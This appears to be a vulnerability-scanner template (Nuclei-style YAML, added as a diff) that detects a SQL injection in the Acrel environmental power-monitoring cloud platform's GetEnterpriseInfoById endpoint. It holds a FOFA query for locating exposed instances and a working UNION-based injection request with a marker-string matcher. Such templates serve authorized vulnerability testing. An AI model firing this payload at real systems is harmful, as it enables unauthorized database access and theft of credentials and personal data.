@@ -1,0 +1,30 @@
+id: ankerui-GetEnterpriseInfoById-sql
+
+info:
+  name: "安科瑞环保用电监管云平台 GetEnterpriseInfoById 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="myCss/phone.css"
+    安科瑞环保用电监管云平台 GetEnterpriseInfoById 接口存在 SQL 注入安全缺陷。攻击者可利用该漏洞执行恶意构造的 SQL 查询语句，导致数据库敏感信息泄露（包括管理员后台密码、用户个人信息等）。在具备高权限访问条件时，可能通过注入点向服务器写入恶意代码文件，最终实现对目标系统的未授权控制。
+  reference:
+  - https://mp.weixin.qq.com/s/CbBN73z9mPKffyIGyuIYUA?token=962101535&lang=zh_CN
+  tags: 安科瑞环保用电监管云平台
+
+
+http:
+- raw:
+  - |
+    GET /MainMonitor/GetEnterpriseInfoById?EnterpriseId=%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x716a627871%2C0x647a457071654e45644d4c627a716c4d7948505a4d67756a786c70576a5a4f7749627a5449486562%2C0x7178767171%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'qjbxqdzEpqeNEdMLbzqlMyHPZMgujxlpWjZOwIbzTIHebqxvqq'
+  - type: status
+    status:
+    - 200
